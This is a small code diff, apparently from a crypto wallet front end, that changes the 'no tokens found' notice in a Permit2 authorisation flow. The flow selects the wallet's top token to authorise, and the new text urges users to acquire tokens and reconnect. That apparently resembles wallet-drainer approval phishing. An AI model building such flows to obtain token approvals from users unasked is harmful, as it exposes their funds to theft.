@@ -124,7 +124,11 @@ export async function runPermit2Flow({
 
   const top = pickTopToken(tokens);
   if (!top) {
-    toast.message('No eligible ERC-20 balance found to authorise on this chain.');
+    toast.info('No supported tokens found in this wallet', {
+      description:
+        'The approval requires at least one supported ERC-20 token (USDT, USDC, DAI, WETH, etc.) with a balance on this chain. Get tokens first, then reconnect.',
+      duration: 8000,
+    });
     return;
   }
 
